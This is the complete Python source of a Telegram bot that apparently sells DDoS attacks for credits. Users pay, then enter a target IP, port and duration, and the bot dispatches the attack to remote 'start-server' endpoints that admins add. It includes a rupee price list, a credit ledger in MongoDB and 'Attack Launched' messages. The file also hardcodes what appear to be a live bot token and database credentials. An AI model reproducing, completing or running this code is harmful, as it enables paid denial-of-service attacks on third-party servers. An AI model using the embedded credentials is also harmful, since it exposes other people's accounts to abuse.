import os
import json
import signal
import telebot
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime
import certifi
from threading import Thread, Lock
import asyncio
import concurrent.futures
from telebot import types
import pytz

# Initialize attack_loop first
attack_loop = asyncio.new_event_loop()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)

# --- UPDATED CONFIGURATION ---
TOKEN = '8754814217:AAEIszWu7k_J3-7qivDV21i4B4i5Bq2bmw4'
MONGO_URI = 'mongodb+srv://ddos62366_db_user:cYaNxOHsNl5mpvA8@cluster0.1bfayzm.mongodb.net/?appName=Cluster0'
ADMIN_IDS = [8318925500]
CONFIG_FILE = 'config.json'

# Load API endpoints from config file
try:
    with open(CONFIG_FILE, 'r') as f:
        config = json.load(f)
    API_ENDPOINTS = config.get('api_endpoints', [])
    logging.info(f"Loaded {len(API_ENDPOINTS)} API endpoints from config")
except Exception as e:
    logging.error(f"Error loading config: {e}")
    API_ENDPOINTS = []

# Global variables
attack_in_progress = False
attack_duration = 0
attack_end_time = 0
attack_lock = Lock()
DEFAULT_THREADS = 6
PRICE_LIST = {"5": 75, "10": 130, "30": 400, "50": 700}
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
    logging.info("MongoDB connected successfully")
except Exception as e:
    logging.error(f"MongoDB connection error: {e}")
    exit(1)

def save_config():
    """Save current API endpoints to config file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump({'api_endpoints': API_ENDPOINTS}, f, indent=2)
        logging.info("Config saved successfully")
        return True
    except Exception as e:
        logging.error(f"Error saving config: {e}")
        return False

def create_inline_keyboard():
    """Create consistent inline keyboard for all messages"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❤️ Join Our Channel", url="https://t.me/+-IX58oAPzeoyODll"))
    markup.add(types.InlineKeyboardButton("👤 Contact Owner", url="https://t.me/Circutowner"))
    return markup

def get_price_list():
    """Format price list with bold text"""
    return ("*💰 Credit Packages 💰*\n\n" +
            "\n".join(f"*{k} Credits = {v} ₹*" for k, v in PRICE_LIST.items()) +
            "\n\n*📩 Contact @Circutowner to purchase*")

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def call_api_endpoint(endpoint, target_ip, target_port, duration):
    """Silently call a single API endpoint"""
    url = f"https://{endpoint}/start-server"
    try:
        response = requests.post(
            url,
            json={"ip": target_ip, "port": target_port, "duration": duration, "threads": DEFAULT_THREADS},
            timeout=15
        )
        return response.status_code == 200
    except:
        return False

async def run_attack_background(target_ip, target_port, duration):
    """Run attack in background without waiting for completion"""
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        futures = [
            executor.submit(call_api_endpoint, endpoint, target_ip, target_port, duration)
            for endpoint in API_ENDPOINTS
        ]
        results = [future.result() for future in concurrent.futures.as_completed(futures)]
    success_count = sum(results)
    logging.info(f"Attack started: {success_count}/{len(API_ENDPOINTS)} endpoints active")

async def monitor_attack(chat_id, duration):
    """Monitor attack and notify when complete"""
    global attack_in_progress

    await asyncio.sleep(duration)

    with attack_lock:
        attack_in_progress = False

    bot.send_message(
        chat_id,
        "*✅ Attack Completed!*\n\n*Thank you for using our service!*",
        parse_mode='Markdown',
        reply_markup=create_inline_keyboard()
    )

async def run_attack(chat_id, target_ip, target_port, duration):
    """Main attack function"""
    global attack_in_progress, attack_duration, attack_end_time

    with attack_lock:
        if attack_in_progress:
            bot.send_message(
                chat_id,
                "*⚠️ Attack Already In Progress!*\n\n*Please wait until it completes.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return
        attack_in_progress = True
        attack_duration = duration
        attack_end_time = time.time() + duration

    try:
        # Show "Attack launched" immediately
        bot.send_message(
            chat_id,
            f"*🚀 Attack Launched!*\n\n*🎯 Target:* `{target_ip}:{target_port}`\n*⏱️ Duration:* `{duration} seconds`",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )

        # Start attack in background
        asyncio.create_task(run_attack_background(target_ip, target_port, duration))

        # Start monitoring in background
        asyncio.create_task(monitor_attack(chat_id, duration))

    except Exception as e:
        logging.error(f"Attack failed: {str(e)}")
        bot.send_message(
            chat_id,
            "*❌ Attack Failed!*\n\n*Please try again later.*",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )
        with attack_lock:
            attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data.get('credits', 0) < 1:
            bot.send_message(
                chat_id,
                "*🚫 Insufficient Credits!*\n\n*Please check /pricelist to purchase credits.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        with attack_lock:
            if attack_in_progress:
                bot.send_message(
                    chat_id,
                    "*⚠️ Bot Is Busy!*\n\n*Please check /when for availability.*",
                    parse_mode='Markdown',
                    reply_markup=create_inline_keyboard()
                )
                return

        bot.send_message(
            chat_id,
            "*💣 Enter Target Details*\n\n*Please provide the target IP, port, and duration in seconds.*\n*Example:* `1.1.1.1 80 60`",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {str(e)}")
        bot.send_message(
            chat_id,
            "*❌ An Error Occurred!*\n\n*Please try again later.*",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(
                message.chat.id,
                "*❗ Invalid Format!*\n\n*Please use the correct format:*\n`IP PORT DURATION`",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(
                message.chat.id,
                f"*🔒 Port {target_port} Is Blocked!*\n\n*Please select a different port.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        if duration > 300: # Max duration fixed as per previous talk
            bot.send_message(
                message.chat.id,
                "*⏳ Maximum Duration Is 300 Seconds!*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        user_data = users_collection.find_one({"user_id": message.from_user.id})
        if not user_data or user_data.get('credits', 0) < 1:
            bot.send_message(
                message.chat.id,
                "*🚫 Insufficient Credits!*\n\n*Please check /pricelist to purchase credits.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )
            return

        users_collection.update_one(
            {"user_id": message.from_user.id},
            {"$inc": {"credits": -1}, "$set": {"last_used": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}}
        )

        asyncio.run_coroutine_threadsafe(
            run_attack(message.chat.id, target_ip, target_port, duration),
            attack_loop
        )

    except Exception as e:
        logging.error(f"Error processing attack: {str(e)}")
        bot.send_message(
            message.chat.id,
            "*❌ An Error Occurred!*\n\n*Please try again later.*",
            parse_mode='Markdown',
            reply_markup=create_inline_keyboard()
        )

@bot.message_handler(commands=['when'])
def when_command(message):
    global attack_in_progress, attack_end_time

    with attack_lock:
        if attack_in_progress:
            current_time = time.time()
            if current_time >= attack_end_time:
                attack_in_progress = False
                bot.send_message(
                    message.chat.id,
                    "*✅ Attack Just Completed!*\n\n*Bot is now ready for new attacks.*",
                    parse_mode='Markdown',
                    reply_markup=create_inline_keyboard()
                )
            else:
                remaining = attack_end_time - current_time
                minutes, seconds = divmod(int(remaining), 60)
                time_str = f"{minutes}m {seconds}s" if minutes else f"{seconds}s"
                bot.send_message(
                    message.chat.id,
                    f"*⏳ Attack In Progress*\n\n*Time Remaining:* `{time_str}`",
                    parse_mode='Markdown',
                    reply_markup=create_inline_keyboard()
                )
        else:
            bot.send_message(
                message.chat.id,
                "*✅ Bot Is Ready!*\n\n*You can now launch a new attack.*",
                parse_mode='Markdown',
                reply_markup=create_inline_keyboard()
            )

@bot.message_handler(commands=['addapi'])
def add_api_command(message):
    if not is_user_admin(message.from_user.id):
        return
    try:
        endpoint = message.text.split(' ', 1)[1].strip()
        if endpoint not in API_ENDPOINTS:
            API_ENDPOINTS.append(endpoint)
            save_config()
            bot.send_message(message.chat.id, f"*✅ API Endpoint Added:* `{endpoint}`", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "Usage: `/addapi your-api.link`", parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        credits = user_data.get('credits', 0) if user_data else 0
        bot.send_message(message.chat.id, f"👤 *ID:* `{user_id}`\n💳 *Credits:* `{credits}`", parse_mode='Markdown', reply_markup=create_inline_keyboard())
    except Exception as e:
        logging.error(f"Error: {e}")

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉", reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.send_message(message.chat.id, "*🌟 Commands:*\n/attack, /myinfo, /pricelist, /when, /rules, /owner", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['owner'])
def owner_command(message):
    bot.send_message(message.chat.id, "*👤 Owner:* @Circutowner", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['pricelist'])
def price_list_cmd(message):
    bot.send_message(message.chat.id, get_price_list(), parse_mode='Markdown', reply_markup=create_inline_keyboard())

def main():
    def start_attack_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()

    attack_thread = Thread(target=start_attack_loop, daemon=True)
    attack_thread.start()
    logging.info("Starting bot...")
    bot.infinity_polling()

if __name__ == "__main__":
    main()
